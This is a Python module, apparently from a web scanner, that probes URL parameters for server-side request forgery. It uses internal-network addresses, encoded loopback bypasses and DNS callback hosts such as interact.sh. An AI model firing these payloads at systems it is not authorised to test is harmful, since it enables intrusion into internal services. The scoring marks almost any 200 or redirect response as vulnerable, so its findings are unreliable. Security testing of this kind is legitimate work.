#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF (Server-Side Request Forgery) Detection Module
===============================================

核心功能：检测目标应用程序是否存在服务端请求伪造漏洞
通过向目标URL的参数中注入内部网络地址和DNS回显payload，
观察响应时间和DNS请求来判断是否存在SSRF漏洞。

"""

import re
import time
import urllib.parse
from typing import List, Dict, Any, Tuple
import requests
import urllib3
from ..common.CreatLog import creatLog


class SSRFTest:
    """
    SSRF漏洞检测类，用于检测和验证服务端请求伪造漏洞
    """

    def __init__(self, project_tag: str, options=None):
        """
        初始化SSRF检测模块
        
        Args:
            project_tag: 项目标识符
            options: 配置选项对象
        """
        self.project_tag = project_tag
        self.options = options
        self.log = creatLog().get_logger()
        # 内部网络测试地址
        self.internal_targets = [
            "127.0.0.1",
            "localhost",
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1"
        ]
        # DNS回显测试地址 (使用burpcollaborator或其他DNS回显服务)
        self.dns_targets = [
            "burpcollaborator.net",
            "interact.sh",
            "oast.me"
        ]
        
        # 创建一个默认的options对象以防传入None
        class DefaultOptions:
            def __init__(self):
                self.proxy = None
                self.ssl_flag = "0"
                self.cookie = None
                self.head = "Cache-Control:no-cache"
                
        if self.options is None:
            self.options = DefaultOptions()

    def generate_ssrf_payloads(self, param_name: str) -> List[Dict[str, Any]]:
        """
        生成SSRF测试payloads
        
        Args:
            param_name: 参数名称
            
        Returns:
            List[Dict[str, Any]]: payloads列表
        """
        payloads = []
        
        # 基础内部网络测试
        for target in self.internal_targets:
            payloads.append({
                'type': 'internal',
                'param': param_name,
                'value': f"http://{target}",
                'description': f'直接访问内部地址 {target}'
            })
            
            payloads.append({
                'type': 'internal',
                'param': param_name,
                'value': f"https://{target}",
                'description': f'HTTPS访问内部地址 {target}'
            })
            
        # DNS回显测试
        timestamp = int(time.time())
        for dns_target in self.dns_targets:
            payloads.append({
                'type': 'dns',
                'param': param_name,
                'value': f"http://{timestamp}.{self.project_tag}.{dns_target}",
                'description': f'DNS回显测试 {timestamp}.{self.project_tag}.{dns_target}'
            })
            
        # 编码绕过测试
        encoded_payloads = [
            # URL编码
            ("http://127.0.0.1", "URL编码"),
            ("http%3A%2F%2F127.0.0.1", "双URL编码"),
            # 十六进制编码
            ("http://0x7f000001", "十六进制IP编码"),
            # 八进制编码
            ("http://0177.0.0.1", "八进制IP编码"),
            # 混合编码
            ("h%65x://127.0.0.1", "混合编码")
        ]
        
        for value, desc in encoded_payloads:
            payloads.append({
                'type': 'encoding',
                'param': param_name,
                'value': value,
                'description': f'{desc}: {value}'
            })
            
        return payloads

    def detect_ssrf_parameters(self, url: str) -> List[str]:
        """
        检测URL中可能的SSRF参数
        
        Args:
            url: 目标URL
            
        Returns:
            List[str]: 可能的SSRF参数列表
        """
        # 常见的SSRF相关参数名
        ssrf_keywords = [
            'url', 'uri', 'link', 'dest', 'redirect', 'redirect_url', 'redirect_uri',
            'redirect_link', 'forward', 'next', 'continue', 'callback', 'return',
            'return_url', 'return_uri', 'return_path', 'image', 'data', 'reference',
            'ref', 'goto', 'location', 'window', 'to', 'out', 'target', 'view', 
            'proxy', 'host', 'port', 'file', 'filename', 'path', 'dir'
        ]
        
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # 检测已知关键词
        potential_params = []
        for param in query_params:
            if any(keyword in param.lower() for keyword in ssrf_keywords):
                potential_params.append(param)
                
        # 如果没有找到已知关键词，返回所有参数（保守策略）
        if not potential_params:
            potential_params = list(query_params.keys())
            
        return potential_params

    def send_ssrf_request(self, url: str, param: str, payload: str) -> Dict[str, Any]:
        """
        发送SSRF测试请求
        
        Args:
            url: 目标URL
            param: 参数名
            payload: 测试载荷
            
        Returns:
            Dict[str, Any]: 响应结果
        """
        urllib3.disable_warnings()
        
        # 解析原始URL和参数
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # 替换目标参数值
        query_params[param] = [payload]
        
        # 重新构建URL
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        # 设置请求头
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        # 添加Cookie（如果存在）
        if hasattr(self.options, 'cookie') and self.options.cookie:
            headers['Cookie'] = self.options.cookie
            
        # 处理自定义头部
        if hasattr(self.options, 'head') and self.options.head and ':' in self.options.head:
            try:
                key, value = self.options.head.split(':', 1)
                headers[key.strip()] = value.strip()
            except:
                pass
                
        ssl_flag = int(getattr(self.options, 'ssl_flag', "0"))
        proxy_data = {'http': getattr(self.options, 'proxy', None), 
                      'https': getattr(self.options, 'proxy', None)}
        
        s = requests.Session()
        s.keep_alive = False
        
        # 记录请求开始时间
        start_time = time.time()
        
        try:
            if ssl_flag == 1:
                response = s.get(new_url, headers=headers, timeout=10, 
                               proxies=proxy_data, verify=False)
            else:
                response = s.get(new_url, headers=headers, timeout=10, 
                               proxies=proxy_data)
                               
            # 记录响应时间
            response_time = time.time() - start_time
            
            return {
                'success': True,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text,
                'content_length': len(response.text),
                'response_time': response_time,
                'url': new_url,
                'param': param,
                'payload': payload
            }
            
        except Exception as e:
            response_time = time.time() - start_time
            return {
                'success': False,
                'error': str(e),
                'response_time': response_time,
                'url': new_url,
                'param': param,
                'payload': payload
            }

    def analyze_ssrf_response(self, response: Dict[str, Any]) -> Dict[str, Any]:
        """
        分析SSRF响应结果
        
        Args:
            response: 响应数据
            
        Returns:
            Dict[str, Any]: 分析结果
        """
        analysis = {
            'is_vulnerable': False,
            'confidence': 'low',
            'issues': [],
            'details': {}
        }
        
        if not response['success']:
            # 如果请求失败，可能是由于连接被拒绝（表明可能访问到了内部服务）
            error_msg = response.get('error', '').lower()
            if any(keyword in error_msg for keyword in ['connection refused', 'connecttimeout']):
                analysis['is_vulnerable'] = True
                analysis['confidence'] = 'medium'
                analysis['issues'].append('连接被拒绝，可能访问到内部服务')
                
            return analysis
            
        # 检查响应时间（长时间延迟可能表示DNS解析或内部网络访问）
        if response['response_time'] > 5:  # 超过5秒
            analysis['issues'].append('响应时间较长，可能存在内部网络访问')
            if not analysis['is_vulnerable']:
                analysis['is_vulnerable'] = True
                analysis['confidence'] = 'low'
                
        # 检查响应内容中的内部服务特征
        content = response.get('content', '').lower()
        internal_indicators = [
            '127.0.0.1', 'localhost', 'apache', 'nginx', 'tomcat', 'iis',
            'docker', 'kubernetes', 'metadata', 'cloud', 'internal'
        ]
        
        found_indicators = [indicator for indicator in internal_indicators if indicator in content]
        if found_indicators:
            analysis['is_vulnerable'] = True
            analysis['confidence'] = 'high' if len(found_indicators) > 2 else 'medium'
            analysis['issues'].append(f'发现内部服务特征: {", ".join(found_indicators)}')
            
        # 检查状态码
        status_code = response.get('status_code', 0)
        if status_code in [200, 301, 302]:
            if not analysis['is_vulnerable']:
                analysis['is_vulnerable'] = True
                analysis['confidence'] = 'low'
            analysis['issues'].append(f'返回成功状态码: {status_code}')
            
        analysis['details'] = {
            'status_code': response.get('status_code'),
            'response_time': response.get('response_time'),
            'content_length': response.get('content_length')
        }
        
        return analysis

    def test_ssrf_vulnerability(self, url: str) -> Dict[str, Any]:
        """
        测试SSRF漏洞
        
        Args:
            url: 目标URL
            
        Returns:
            Dict[str, Any]: 测试结果
        """
        self.log.info(f"[SSRF] 开始检测URL: {url}")
        
        # 检测可能的SSRF参数
        potential_params = self.detect_ssrf_parameters(url)
        
        if not potential_params:
            self.log.warning("[SSRF] 未找到可能的SSRF参数")
            return {
                'url': url,
                'vulnerable': False,
                'message': '未找到可能的SSRF参数'
            }
            
        self.log.info(f"[SSRF] 发现潜在参数: {potential_params}")
        
        # 存储所有测试结果
        results = {
            'url': url,
            'parameters': {},
            'vulnerable': False,
            'findings': []
        }
        
        # 对每个潜在参数进行测试
        for param in potential_params:
            self.log.info(f"[SSRF] 测试参数: {param}")
            
            # 生成测试payloads
            payloads = self.generate_ssrf_payloads(param)
            
            param_results = {
                'payloads': [],
                'vulnerabilities': []
            }
            
            # 对每个payload进行测试
            for payload in payloads:
                self.log.debug(f"[SSRF] 测试Payload: {payload['value']}")
                
                # 发送请求
                response = self.send_ssrf_request(url, param, payload['value'])
                
                # 分析响应
                analysis = self.analyze_ssrf_response(response)
                
                payload_result = {
                    'payload': payload,
                    'response': response,
                    'analysis': analysis
                }
                
                param_results['payloads'].append(payload_result)
                
                # 如果发现漏洞，记录下来
                if analysis['is_vulnerable']:
                    vulnerability = {
                        'param': param,
                        'payload': payload['value'],
                        'confidence': analysis['confidence'],
                        'issues': analysis['issues'],
                        'details': analysis['details']
                    }
                    
                    param_results['vulnerabilities'].append(vulnerability)
                    results['findings'].append(vulnerability)
                    
                    self.log.warning(f"[SSRF] 发现潜在漏洞 - 参数: {param}, Payload: {payload['value']}")
            
            results['parameters'][param] = param_results
            
        # 判断整体是否 vulnerable
        results['vulnerable'] = len(results['findings']) > 0
        
        if results['vulnerable']:
            self.log.warning(f"[SSRF] 在URL {url} 中发现SSRF漏洞")
        else:
            self.log.info(f"[SSRF] 未在URL {url} 中发现SSRF漏洞")
            
        return results

    def start_ssrf_test(self):
        """
        启动SSRF测试（预留接口）
        """
        self.log.info("[SSRF] SSRF测试模块已初始化")